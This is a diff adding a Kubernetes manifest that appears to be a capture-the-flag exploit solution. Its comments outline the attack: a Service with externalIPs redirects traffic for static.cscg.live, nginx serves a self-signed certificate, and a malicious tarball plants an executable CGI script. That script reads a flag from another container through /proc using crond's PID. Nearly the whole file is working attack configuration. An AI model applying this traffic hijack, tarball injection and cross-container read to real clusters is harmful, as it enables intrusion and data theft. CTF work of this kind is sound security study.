@@ -1,0 +1,172 @@
+# Exploit flow:
+# 1. create a service that redirects traffic from static.cscg.live to our deployment
+# 2. host a malicious tar.gz file from the deployment
+# 3. the supercluster downloads the file with wget, busybox wget doesn't do certificate validation when openssl is not installed, so we can use a self signed certificate
+# 4. the tar.gz file is unpacked to the www directory of the httpd server, it contains the folder cgi-bin with a file exp.sh that is executable
+# 5. when the path to this file is requested from httpd it will execute the script
+# 6. the flag is in another container in the same pod but the PID namespace is shared
+# 7. the script reads the flag via the /proc fs using the process ID of crond
+
+# configure nginx with https
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: nginx-config
+  namespace: ctf
+data:
+  default.conf: |
+    server {
+        listen       80;
+        listen  [::]:80;
+        listen 443 ssl;
+        listen [::]:443 ssl;
+        ssl_certificate /cert/cert.pem;
+        ssl_certificate_key /cert/key.pem;
+        server_name _;
+
+        location / {
+            root   /usr/share/nginx/html;
+            index  index.html index.htm;
+        }
+    }
+---
+# cgi-bin file that will eventually be executed by httpd
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: cgi-exploit
+  namespace: ctf
+data:
+  exp.sh: |
+    #!/bin/sh
+    echo "Content-Type: text/html"
+    echo ""
+    echo "flag:"
+    cat "/proc/$(pidof crond)/root/flag/flag"
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: exploit-host
+  namespace: ctf
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: exploit-host
+  template:
+    metadata:
+      labels:
+        app: exploit-host
+    spec:
+      initContainers:
+      # generate a certificate for nginx
+      - name: cert-gen
+        image: alpine/openssl:3.3.3
+        securityContext:
+          runAsNonRoot: true
+          runAsUser: 1000
+          runAsGroup: 1000
+          allowPrivilegeEscalation: false
+          seccompProfile:
+            type: "RuntimeDefault"
+          capabilities:
+            drop: ["ALL"]
+        resources:
+          limits:
+            cpu: 0.5
+            memory: 500M
+        args: ["req", "-new", "-newkey", "rsa:2048", "-days", "365", "-nodes", "-x509", "-subj", "/C=DE/ST=none/L=nowhere/O=nobody/CN=static.cscg.live", "-keyout", "/cert/key.pem", "-out", "/cert/cert.pem"]
+        volumeMounts:
+        - name: cert
+          mountPath: "/cert"
+      # generate a tar.gz file with the malicious cgi-bin script
+      - name: www-gen
+        image: busybox:1.37.0-uclibc
+        securityContext:
+          runAsNonRoot: true
+          runAsUser: 1000
+          runAsGroup: 1000
+          allowPrivilegeEscalation: false
+          seccompProfile:
+            type: "RuntimeDefault"
+          capabilities:
+            drop: ["ALL"]
+        resources:
+          limits:
+            cpu: 0.5
+            memory: 500M
+        command: ["sh", "-c"]
+        args: ["mkdir -p /www/ccceaebec38a3e60436789e9108a3a0e9a34532fd8ef2a98b0acf0b686d9a666/; tar -c -a -h -f /www/ccceaebec38a3e60436789e9108a3a0e9a34532fd8ef2a98b0acf0b686d9a666/superclusters.tar.gz /cgi-bin"]
+        volumeMounts:
+        - name: cgi-bin
+          mountPath: "/cgi-bin"
+        - name: www
+          mountPath: "/www"
+      containers:
+      # main container that hosts the tar.gz file
+      - name: exploit-host
+        image: nginx:1.27.4-alpine-slim
+        securityContext:
+          runAsNonRoot: true
+          runAsUser: 1000
+          runAsGroup: 1000
+          allowPrivilegeEscalation: false
+          seccompProfile:
+            type: "RuntimeDefault"
+          capabilities:
+            drop: ["ALL"]
+        resources:
+          limits:
+            cpu: 0.5
+            memory: 500M
+        volumeMounts:
+        - name: cert
+          readOnly: true
+          mountPath: "/cert"
+        - name: nginx-config
+          readOnly: true
+          mountPath: "/etc/nginx/conf.d"
+        - name: www
+          readOnly: true
+          mountPath: "/usr/share/nginx/html"
+        - name: cache
+          mountPath: "/var/cache/nginx"
+        - name: run
+          mountPath: "/var/run"
+      volumes:
+      - name: nginx-config
+        configMap:
+          name: nginx-config
+      - name: cgi-bin
+        configMap:
+          name: cgi-exploit
+          defaultMode: 0755
+      - name: cert
+        emptyDir: {}
+      - name: www
+        emptyDir: {}
+      - name: cache
+        emptyDir: {}
+      - name: run
+        emptyDir: {}
+---
+# service to redirect traffic for static.cscg.live to our deployment
+apiVersion: v1
+kind: Service
+metadata:
+  name: exploit-service
+  namespace: ctf
+spec:
+  selector:
+    app: exploit-host
+  ports:
+    - name: http
+      protocol: TCP
+      port: 443
+      targetPort: 443
+  externalIPs:
+    # IPs of static.cscg.live
+    - 147.28.207.143
+    - 147.28.207.163
+    - 147.75.204.231
